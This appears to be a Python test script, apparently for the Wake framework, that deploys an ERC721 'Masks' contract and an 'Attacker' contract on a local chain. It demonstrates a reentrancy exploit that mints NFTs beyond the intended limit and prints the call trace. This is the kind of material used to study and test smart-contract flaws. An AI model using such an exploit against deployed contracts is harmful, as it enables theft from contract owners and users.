from wake.testing import *

from pytypes.contracts.erc721.Vault import Masks
from pytypes.contracts.erc721.Attacker import Attacker

@default_chain.connect()
def test_default():
    print("---------------------ERC721 Reentrancy---------------------")
    victim = default_chain.accounts[0]
    attacker = default_chain.accounts[1]
    general_user = default_chain.accounts[2]

    hashmask = Masks.deploy(from_=victim)
    attacker_contract = Attacker.deploy(hashmask, value="20 ether", from_=attacker)

    hashmask.mintNFT(20, value="2 ether", from_=general_user) # general user mint 20 NFT

    print("this vault should be able to mint up to 20 NFT in One transaction")
    print("and remaining mintable NFT is: ", hashmask.MAX_NFT_SUPPLY() - hashmask.totalSupply())
    print("---------------------attack---------------------")

    tx = attacker_contract.attack(from_=attacker)
    print(tx.call_trace)

    print("Attacker mint NFT :", attacker_contract.nftCount())
    print("Total Supplied NFT: ", hashmask.totalSupply())
